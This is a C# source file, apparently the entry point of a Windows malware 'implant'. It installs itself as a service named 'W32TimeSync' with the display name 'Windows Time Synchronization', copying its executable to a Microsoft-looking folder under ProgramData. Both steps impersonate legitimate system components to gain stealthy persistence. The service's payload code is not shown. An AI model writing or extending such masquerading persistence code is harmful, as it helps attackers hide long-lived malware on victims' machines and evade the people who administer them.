using System;
using System.IO;
using System.Reflection;
using System.ServiceProcess;

namespace WinSvcImplant
{
    internal static class Program
    {
        internal const string ServiceName = "W32TimeSync";
        internal const string DisplayName = "Windows Time Synchronization";

        private static void Main(string[] args)
        {
            string cmd = args.Length > 0 ? args[0].Trim().ToLowerInvariant() : string.Empty;

            switch (cmd)
            {
                case "install":
                    Install();
                    break;
                case "uninstall":
                    Uninstall();
                    break;
                case "run":
                default:
                    ServiceBase.Run(new ImplantService());
                    break;
            }
        }

        private static string DeployPath()
        {
            string dir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                "Microsoft", "DeviceSync");
            Directory.CreateDirectory(dir);
            return Path.Combine(dir, "devsyncsvc.exe");
        }

        private static void Install()
        {
            string src = Assembly.GetExecutingAssembly().Location;
            string dst = DeployPath();

            if (!string.Equals(src, dst, StringComparison.OrdinalIgnoreCase))
                File.Copy(src, dst, true);

            ServiceControl.Install(ServiceName, DisplayName, dst);
        }

        private static void Uninstall()
        {
            ServiceControl.Uninstall(ServiceName);
        }
    }
}
